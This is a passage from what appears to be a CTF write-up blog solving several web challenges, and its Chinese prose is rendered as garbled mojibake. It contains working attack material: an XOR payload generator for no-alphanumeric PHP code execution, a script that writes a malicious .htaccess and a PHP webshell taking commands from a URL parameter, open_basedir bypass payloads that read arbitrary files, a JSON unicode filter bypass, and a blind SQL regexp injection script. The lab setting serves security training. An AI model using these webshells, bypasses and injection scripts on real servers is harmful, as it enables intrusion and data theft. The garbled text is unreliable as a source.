æ–‡ä»¶ã€‚ä»evalé‚£æ‹¿flagå¾ˆæ˜æ˜¾æ˜¯å¾ˆå›°éš¾çš„ï¼Œæ‰€ä»¥å¯ä»¥æ¢ä¸ªæ€è·¯ï¼Œé€šè¿‡eval()æ‰§è¡Œget_the_flag()å‡½æ•°ï¼Œç„¶åè¿›è¡Œæ–‡ä»¶ä¸Šä¼ ä¸€å¥è¯æœ¨é©¬ã€‚</p><h3 id="æ— æ•°å­—å­—æ¯RCE"><a href="#æ— æ•°å­—å­—æ¯RCE" class="headerlink" title="æ— æ•°å­—å­—æ¯RCE"></a>æ— æ•°å­—å­—æ¯RCE</h3><p>é¦–å…ˆæ˜¯è¦èƒ½æ‰§è¡Œget_the_flag()å‡½æ•°ï¼Œä½†æ˜¯ç”±äºæŠŠæ•°å­—å’Œå­—æ¯éƒ½banäº† ï¼Œæ‰€ä»¥è¿™é‡Œå‡†å¤‡ç”¨å¼‚æˆ–ç»•</p><p>ç›´æ¥ä¸Šè„šæœ¬</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$need</span> = <span class="string">&quot;_GET&quot;</span>;</span><br><span class="line"><span class="variable">$payload</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; strlen(<span class="variable">$need</span>); <span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="number">0</span>; <span class="variable">$j</span> &lt; <span class="number">255</span>; <span class="variable">$j</span>++)&#123;</span><br><span class="line">        <span class="variable">$k</span> = chr(<span class="variable">$j</span>)^chr(<span class="number">255</span>); <span class="comment">// dechex(255)=ff</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$k</span> == <span class="variable">$need</span>[<span class="variable">$i</span>])&#123;</span><br><span class="line">            <span class="variable">$payload</span> .= <span class="string">&#x27;%&#x27;</span>.dechex(<span class="variable">$j</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$payload</span>;</span><br></pre></td></tr></table></figure><p>ç”¨phpinfoè¯•è¯•</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210723163944086.png"></p><p>å…¶å®è¿™é‡Œæœ‰ä¸ªéé¢„æœŸè§£ï¼Œåœ¨phpinfoé‡Œç›´æ¥æœflagæ˜¯å¯ä»¥æ‹¿åˆ°flagçš„ã€‚</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210723164025712.png"></p><h3 id="æ–‡ä»¶ä¸Šä¼ ç»•è¿‡"><a href="#æ–‡ä»¶ä¸Šä¼ ç»•è¿‡" class="headerlink" title="æ–‡ä»¶ä¸Šä¼ ç»•è¿‡"></a>æ–‡ä»¶ä¸Šä¼ ç»•è¿‡</h3><p>è¿™é‡Œè™½ç„¶èƒ½ä¸Šä¼ æ–‡ä»¶äº†ï¼Œä½†æ˜¯è¿˜æ˜¯éœ€è¦ç»•è¿‡ä¸€äº›ifã€‚</p><p>é¦–å…ˆæ˜¯</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&quot;/ph/i&quot;</span>,<span class="variable">$extension</span>)) <span class="keyword">die</span>(<span class="string">&quot;^_^&quot;</span>);</span><br></pre></td></tr></table></figure><p>è¿™è¦ç»•phï¼Œå¯ä»¥ç”¨.htaccessç»•è¿‡ã€‚</p><p>ç„¶åæ˜¯</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(mb_strpos(file_get_contents(<span class="variable">$tmp_name</span>), <span class="string">&#x27;&lt;?&#x27;</span>)!==<span class="literal">False</span>) <span class="keyword">die</span>(<span class="string">&quot;^_^&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(!exif_imagetype(<span class="variable">$tmp_name</span>)) <span class="keyword">die</span>(<span class="string">&quot;^_^&quot;</span>);</span><br></pre></td></tr></table></figure><p>è¿™é‡Œåˆ™éœ€è¦ç»•è¿‡â€™&lt;?â€™å’Œexif_imagetype()ï¼Œ<a href="https://www.cnblogs.com/tr1ple/p/11207145.html">å…·ä½“åŸç†çœ‹è¿™</a>ã€‚</p><p>ç›´æ¥ç”¨è„šæœ¬ç”Ÿæˆæ–‡ä»¶ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">SIZE_HEADER = <span class="string">b&quot;\n\n#define width 1337\n#define height 1337\n\n&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_php_file</span>(<span class="params">filename, script</span>):</span></span><br><span class="line">    phpfile = <span class="built_in">open</span>(filename, <span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    phpfile.write(script.encode(<span class="string">&#x27;utf-16be&#x27;</span>))</span><br><span class="line">    phpfile.write(SIZE_HEADER)</span><br><span class="line"></span><br><span class="line">    phpfile.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_htacess</span>():</span></span><br><span class="line">    htaccess = <span class="built_in">open</span>(<span class="string">&#x27;.htaccess&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    htaccess.write(SIZE_HEADER)</span><br><span class="line">    htaccess.write(<span class="string">b&#x27;AddType application/x-httpd-php .lethe\n&#x27;</span>)</span><br><span class="line">    htaccess.write(<span class="string">b&#x27;php_value zend.multibyte 1\n&#x27;</span>)</span><br><span class="line">    htaccess.write(<span class="string">b&#x27;php_value zend.detect_unicode 1\n&#x27;</span>)</span><br><span class="line">    htaccess.write(<span class="string">b&#x27;php_value display_errors 1\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    htaccess.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">generate_htacess()</span><br><span class="line"></span><br><span class="line">generate_php_file(<span class="string">&quot;shell.lethe&quot;</span>, <span class="string">&quot;&lt;?php eval($_GET[&#x27;cmd&#x27;]); die(); ?&gt;&quot;</span>)</span><br></pre></td></tr></table></figure><p>ç„¶åç”¨postmanåˆ†åˆ«ä¸Šä¼ ã€‚</p><p>æˆåŠŸè¿›å…¥åå³å¯æ‹¿åˆ°eval()å¯æ§æƒï¼Œä½†æ˜¯ä»ä¹‹å‰çš„phpinfoé‡Œå¯ä»¥çœ‹å‡ºï¼Œbanäº†è®¸å¤šå‡½æ•°äº†ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥é€‰æ‹©è¯»å–ç›®å½•ï¼Œç„¶åæŸ¥çœ‹flagçš„ä½ç½®ç›´æ¥æ‰“å¼€ã€‚</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210723170916176.png"></p><p>è¿™é‡Œå¯ä»¥çœ‹å‡ºé¢˜ç›®åšäº†open_basediré™åˆ¶ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦ç»•è¿‡open_basedir()ã€‚</p><h3 id="open-basedir-ç»•è¿‡"><a href="#open-basedir-ç»•è¿‡" class="headerlink" title="open_basedir()ç»•è¿‡"></a>open_basedir()ç»•è¿‡</h3><p><a href="https://skysec.top/2019/04/12/%E4%BB%8EPHP%E5%BA%95%E5%B1%82%E7%9C%8Bopen-basedir-bypass/#ini-set%E8%A6%86%E7%9B%96%E9%97%AE%E9%A2%98%E6%8E%A2%E7%B4%A2">å…·ä½“åŸç†çœ‹è¿™</a>ã€‚</p><p>ç„¶åæ„é€ å‡ºä¸€ä¸ªæŸ¥çœ‹æ ¹ç›®å½•çš„payloadï¼š</p><blockquote><p>cmd=chdir(â€˜/tmpâ€™);mkdir(â€˜R0SWâ€™);chdir(â€˜R0SWâ€™);ini_set(â€˜open_basedirâ€™,â€™..â€™);chdir(â€˜..â€™);chdir(â€˜..â€™);chdir(â€˜..â€™);chdir(â€˜..â€™);ini_set(â€˜open_basedirâ€™,â€™/â€˜);var_dump(scandir(â€˜/â€˜));</p></blockquote><p>ç„¶åç›´æ¥æŸ¥çœ‹flagï¼Œpayload:</p><blockquote><p>cmd=chdir(â€˜/tmpâ€™);mkdir(â€˜R0SWâ€™);chdir(â€˜R0SWâ€™);ini_set(â€˜open_basedirâ€™,â€™..â€™);chdir(â€˜..â€™);chdir(â€˜..â€™);chdir(â€˜..â€™);chdir(â€˜..â€™);ini_set(â€˜open_basedirâ€™,â€™/â€˜);var_dump(file_get_contents(THis_Is_tHe_F14g));</p></blockquote><p>å³å¯æ‹¿åˆ°flag</p><blockquote><p>flag{8150a122-84de-4eb3-bae2-1fc81971f572}</p></blockquote><h2 id="HarekazeCTF2019-encode-and-encode"><a href="#HarekazeCTF2019-encode-and-encode" class="headerlink" title="[HarekazeCTF2019]encode_and_encode"></a>[HarekazeCTF2019]encode_and_encode</h2><p>å¥½é•¿çš„åå­—(x</p><h3 id="jsonç¼–ç ç»•è¿‡"><a href="#jsonç¼–ç ç»•è¿‡" class="headerlink" title="jsonç¼–ç ç»•è¿‡"></a>jsonç¼–ç ç»•è¿‡</h3><p>é¢˜ç›®ç›´æ¥ç»™äº†query.phpçš„æºç ï¼Œç›´æ¥å®¡è®¡æºç ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>])) &#123;</span><br><span class="line">  show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span>(<span class="params"><span class="variable">$str</span></span>) </span>&#123;</span><br><span class="line">  <span class="variable">$banword</span> = [</span><br><span class="line">    <span class="comment">// no path traversal</span></span><br><span class="line">    <span class="string">&#x27;\.\.&#x27;</span>,</span><br><span class="line">    <span class="comment">// no stream wrapper</span></span><br><span class="line">    <span class="string">&#x27;(php|file|glob|data|tp|zip|zlib|phar):&#x27;</span>,</span><br><span class="line">    <span class="comment">// no data exfiltration</span></span><br><span class="line">    <span class="string">&#x27;flag&#x27;</span></span><br><span class="line">  ];</span><br><span class="line">  <span class="variable">$regexp</span> = <span class="string">&#x27;/&#x27;</span> . implode(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$banword</span>) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">  <span class="keyword">if</span> (preg_match(<span class="variable">$regexp</span>, <span class="variable">$str</span>)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$body</span> = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="variable">$json</span> = json_decode(<span class="variable">$body</span>, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (is_valid(<span class="variable">$body</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$json</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$json</span>[<span class="string">&#x27;page&#x27;</span>])) &#123;</span><br><span class="line">  <span class="variable">$page</span> = <span class="variable">$json</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line">  <span class="variable">$content</span> = file_get_contents(<span class="variable">$page</span>);</span><br><span class="line">  <span class="keyword">if</span> (!<span class="variable">$content</span> || !is_valid(<span class="variable">$content</span>)) &#123;</span><br><span class="line">    <span class="variable">$content</span> = <span class="string">&quot;&lt;p&gt;not found&lt;/p&gt;\n&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="variable">$content</span> = <span class="string">&#x27;&lt;p&gt;invalid request&lt;/p&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// no data exfiltration!!!</span></span><br><span class="line"><span class="variable">$content</span> = preg_replace(<span class="string">&#x27;/HarekazeCTF\&#123;.+\&#125;/i&#x27;</span>, <span class="string">&#x27;HarekazeCTF&#123;&amp;lt;censored&amp;gt;&#125;&#x27;</span>, <span class="variable">$content</span>);</span><br><span class="line"><span class="keyword">echo</span> json_encode([<span class="string">&#x27;content&#x27;</span> =&gt; <span class="variable">$content</span>]);</span><br></pre></td></tr></table></figure><p>å…ˆæ˜¯ç»™äº†ä¸ªæ­£åˆ™è¿‡æ»¤å‡½æ•°ï¼Œè¿‡æ»¤æ‰äº†ä¸€äº›å­—ç¬¦ï¼Œè¿˜ä¸ç»™ç›®å½•éå†ã€‚</p><p>ç„¶åæ˜¯ä»php://inputä¼ªåè®®ä¸­è¯»å–ï¼Œæ¥ç€json_decodeä¸€ä¸‹ï¼Œä¹‹åå°±æ˜¯ifæŸ¥è¿‡æ»¤ã€‚</p><p>ä½†æ˜¯ï¼Œbutï¼Œifé‡ŒæŸ¥çš„æ˜¯$bodyï¼Œè€Œä¸æ˜¯$jsonï¼Œé‚£ä¹ˆè¿™é‡Œå°±å¥½ç»•äº†ï¼Œæˆ‘ä»¬åªéœ€è¦ç”¨ä¸€ä¸ªjson_decodeèƒ½è§£å‡ºæ¥çš„ï¼Œè€Œphpä¸èƒ½è§£å‡ºæ¥çš„ç¼–ç å³å¯ç»•è¿‡ï¼Œé‚£å°±æ˜¯unicodeç¼–ç ã€‚</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210724110131492.png"></p><p>ç„¶åç›´æ¥burpsuiteé‡Œpostå°±è¡Œäº†ã€‚</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210724110227147.png"></p><p>æ‹¿åˆ°flag</p><blockquote><p>flag{87cab010-10db-422e-8687-246e2406df00}</p></blockquote><h2 id="b01lers2020-Welcome-to-Earth"><a href="#b01lers2020-Welcome-to-Earth" class="headerlink" title="[b01lers2020]Welcome to Earth"></a>[b01lers2020]Welcome to Earth</h2><h3 id="BurpSuiteæ‹¦æˆª"><a href="#BurpSuiteæ‹¦æˆª" class="headerlink" title="BurpSuiteæ‹¦æˆª"></a>BurpSuiteæ‹¦æˆª</h3><p>æ‰“å¼€é¢˜ç›®å‘ç°é¡µé¢ä¼šè‡ªåŠ¨è·³è½¬ï¼Œè·³è½¬åˆ°ä¸€ä¸ªä»€ä¹ˆä¹Ÿæ²¡æœ‰çš„/die/ï¼Œç”¨BurpSuiteæ‹¦ä¸€æ‹¦ã€‚</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210724141342373.png"></p><p>å‘ç°ä¸€ä¸ª/chase/ï¼Œç›´æ¥è·³è½¬è¿›å»ã€‚</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210724141525502.png"></p><p>æœ‰ä¸‰ä¸ªéƒ½æ˜¯è¿›/die/çš„ï¼Œæœ‰ä¸€ä¸ªè¿›äº†/leftt/ï¼Œè·Ÿè¿›å»ã€‚</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210724141622040.png"></p><p>æœ‰ä¸ª/shoot/ï¼Œè·Ÿè¿›å»ã€‚</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210724141847790.png"></p><p>è·Ÿåˆ°/door/ä¹‹åéœ€è¦æŸ¥çœ‹door.jsã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_door</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> all_radio = <span class="built_in">document</span>.getElementById(<span class="string">&quot;door_form&quot;</span>).elements;</span><br><span class="line">  <span class="keyword">var</span> guess = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; all_radio.length; i++)</span><br><span class="line">    <span class="keyword">if</span> (all_radio[i].checked) guess = all_radio[i].value;</span><br><span class="line"></span><br><span class="line">  rand = <span class="built_in">Math</span>.floor(<span class="built_in">Math</span>.random() * <span class="number">360</span>);</span><br><span class="line">  <span class="keyword">if</span> (rand == guess) <span class="built_in">window</span>.location = <span class="string">&quot;/open/&quot;</span>;</span><br><span class="line">  <span class="keyword">else</span> <span class="built_in">window</span>.location = <span class="string">&quot;/die/&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è·Ÿè¿›/open/ï¼Œè¿›å»open_sesame.jsã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sleep</span>(<span class="params">ms</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="params">resolve</span> =&gt;</span> <span class="built_in">setTimeout</span>(resolve, ms));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">open</span>(<span class="params">i</span>) </span>&#123;</span><br><span class="line">  sleep(<span class="number">1</span>).then(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    open(i + <span class="number">1</span>);</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="keyword">if</span> (i == <span class="number">4000000000</span>) <span class="built_in">window</span>.location = <span class="string">&quot;/fight/&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è·Ÿè¿›/fight/ï¼Œè¿›å»fight.jsã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Run to scramble original flag</span></span><br><span class="line"><span class="comment">//console.log(scramble(flag, action));</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">scramble</span>(<span class="params">flag, key</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; key.length; i++) &#123;</span><br><span class="line">    <span class="keyword">let</span> n = key.charCodeAt(i) % flag.length;</span><br><span class="line">    <span class="keyword">let</span> temp = flag[i];</span><br><span class="line">    flag[i] = flag[n];</span><br><span class="line">    flag[n] = temp;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> flag;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_action</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> action = <span class="built_in">document</span>.getElementById(<span class="string">&quot;action&quot;</span>).value;</span><br><span class="line">  <span class="keyword">var</span> flag = [<span class="string">&quot;&#123;hey&quot;</span>, <span class="string">&quot;_boy&quot;</span>, <span class="string">&quot;aaaa&quot;</span>, <span class="string">&quot;s_im&quot;</span>, <span class="string">&quot;ck!&#125;&quot;</span>, <span class="string">&quot;_baa&quot;</span>, <span class="string">&quot;aaaa&quot;</span>, <span class="string">&quot;pctf&quot;</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">// <span class="doctag">TODO:</span> unscramble function</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå°±ç»™å‡ºäº†flagï¼Œä½†æ˜¯æ˜¯ä¹±åºçš„ï¼Œå†™è„šæœ¬æ’ä¸‹åºã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> permutations</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = [<span class="string">&quot;&#123;hey&quot;</span>, <span class="string">&quot;_boy&quot;</span>, <span class="string">&quot;aaaa&quot;</span>, <span class="string">&quot;s_im&quot;</span>, <span class="string">&quot;ck!&#125;&quot;</span>, <span class="string">&quot;_baa&quot;</span>, <span class="string">&quot;aaaa&quot;</span>, <span class="string">&quot;pctf&quot;</span>]</span><br><span class="line">item = permutations(flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> item:</span><br><span class="line">    <span class="comment"># print(i)</span></span><br><span class="line">    j = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">list</span>(i))</span><br><span class="line">    <span class="comment"># print(j)</span></span><br><span class="line">    <span class="keyword">if</span> j.startswith(<span class="string">&quot;pctf&#123;hey_boys&quot;</span>) <span class="keyword">and</span> j[-<span class="number">1</span>] == <span class="string">&quot;&#125;&quot;</span>:</span><br><span class="line">        print(j)</span><br></pre></td></tr></table></figure><p>é¡ºåºæ­£å¸¸çš„é‚£ä¸ªå°±æ˜¯flagã€‚</p><blockquote><p>pctf{hey_boys_im_baaaaaaaaaack!}</p></blockquote><h2 id="NCTF2019-SQLi"><a href="#NCTF2019-SQLi" class="headerlink" title="[NCTF2019]SQLi"></a>[NCTF2019]SQLi</h2><h3 id="regexpæ³¨å…¥"><a href="#regexpæ³¨å…¥" class="headerlink" title="regexpæ³¨å…¥"></a>regexpæ³¨å…¥</h3><p>æœ‰robots.txtï¼Œè¿›å»å¯ä»¥æ‹¿åˆ°hint.txt</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$black_list</span> = <span class="string">&quot;/limit|by|substr|mid|,|admin|benchmark|like|or|char|union|substring|select|greatest|%00|&#x27;|=| |in|&lt;|&gt;|-|.|()|#|and|if|database|users|where|table|concat|insert|join|having|sleep/i&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">If</span> <span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>] === admin<span class="string">&#x27;s password,</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Then you will get the flag;</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œç›´æ¥å°±ç»™å‡ºäº†è¿‡æ»¤çš„å†…å®¹ï¼Œbanäº†æŒºå¤šä¸œè¥¿çš„ï¼Œä½†æ˜¯åªè¦æœ‰passwordå°±å¯ä»¥æ‹¿åˆ°flagï¼Œè€Œä¸”regexpæ”¾å‡ºæ¥äº†ï¼Œå°è¯•regexpæ³¨å…¥ã€‚</p><p>å†™ç›²æ³¨è„šæœ¬å‰å…ˆè·‘ä¸€ä¸‹æ­£ç¡®çš„æ˜¾ç¤ºï¼Œæ–¹ä¾¿å†™è„šæœ¬ã€‚</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210724153506270.png"></p><p>ç„¶åæ˜¯å†™è„šæœ¬æ—¶é—´ï¼è™½ç„¶ç©ºæ ¼æ²¡äº†ï¼Œä½†æ˜¯å¯ä»¥ç”¨/**/æ³¨é‡Šç¬¦ä»£æ›¿</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://7c2e6748-2f52-4cd7-bf7e-353a4bab5b98.node4.buuoj.cn/&quot;</span></span><br><span class="line">reg = <span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890&quot;</span> + <span class="string">&quot;_&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> mid <span class="keyword">in</span> reg:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>: <span class="string">&quot;\\&quot;</span>,</span><br><span class="line">            <span class="string">&quot;passwd&quot;</span>: <span class="string">f&#x27;||/**/passwd/**/regexp/**/&quot;^<span class="subst">&#123;flag + mid&#125;</span>&quot;;<span class="subst">&#123;parse.unquote(<span class="string">&quot;%00&quot;</span>)&#125;</span>&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        res = requests.post(url=url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;welcome.php&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            flag += mid</span><br><span class="line">            print(<span class="string">f&quot;[+]Flag new is: <span class="subst">&#123;flag.lower()&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥è·‘å‡ºpassword</p><blockquote><p>you_will_never_know7788990</p></blockquote><p>ç„¶åç›´æ¥ç™»é™†å°±è¡Œäº†ã€‚</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210724154414300.png"></p><p>æ‹¿åˆ°flag</p><blockquote><p>flag{0c36d354-c693-4611-9c3b-ff418512f386}</p></blockquote><h2 id="watevrCTF-2019-Cookie-Store"><a href="#watevrCTF-2019-Cookie-Store" class="headerlink" title="[watevrCTF-2019]Cookie Store"></a>[watevrCTF-2019]Cookie Store</h2><p>ç­¾åˆ°é¢˜ä¼°è®¡æ˜¯ãƒ¾(Â´ï½¥ï½¥ï½€ï½¡)ãƒã€‚</p><h3 id="cookieä¼ªé€ -1"><a href="#cookieä¼ªé€ -1" class="headerlink" title="cookieä¼ªé€ "></a>cookieä¼ªé€ </h3><p>ç›´æ¥æ‹¿cookieå»base64è§£ç ï¼Œç„¶åæŠŠmoneyæ”¹åˆ°100ä»¥ä¸Šï¼Œç›´æ¥ä¹°æ›²å¥‡å°±èƒ½æ‹¿åˆ°flagã€‚</p><p><img 